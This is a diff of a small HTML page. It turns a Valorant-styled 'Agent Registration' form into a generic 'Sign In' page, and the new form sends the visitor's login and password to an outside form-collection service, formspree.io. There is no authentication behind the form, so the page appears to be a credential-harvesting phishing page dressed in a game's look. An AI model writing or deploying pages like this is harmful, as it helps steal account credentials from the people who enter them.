@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Agent Registration</title>
+<title>Login</title>
 
 <style>
 
 body{
-margin:0;
-font-family:Arial, sans-serif;
-background:#0f1923;
-color:white;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
+background:#0f1923;
+font-family:Arial;
 }
 
 .box{
@@ -44,32 +41,13 @@ color:white;
 border:1px solid #333;
 }
 
-input:focus{
-outline:none;
-border:1px solid #ff4655;
-}
-
 button{
 width:100%;
 padding:12px;
-margin-top:15px;
-border:none;
-border-radius:4px;
 background:#ff4655;
+border:none;
 color:white;
-font-weight:bold;
 cursor:pointer;
-transition:0.2s;
-}
-
-button:hover{
-background:#ff2a3d;
-}
-
-.subtitle{
-font-size:13px;
-color:#aaa;
-margin-bottom:20px;
 }
 
 </style>
@@ -79,14 +57,16 @@ margin-bottom:20px;
 
 <div class="box">
 
-<h1>AGENT ACCESS</h1>
-<div class="subtitle">Secure Valorant System</div>
+<h1>Sign In</h1>
 
-<form>
-<input type="text" placeholder="Nickname">
-<input type="email" placeholder="Email">
-<input type="text" placeholder="Agent Name">
-<button type="submit">ENTER</button>
+<form action="https://formspree.io/f/xkqoweza" method="POST">
+
+<input type="text" name="login" placeholder="Login">
+
+<input type="password" name="password" placeholder="Password">
+
+<button type="submit">Sign in</button>
+
 </form>
 
 </div>
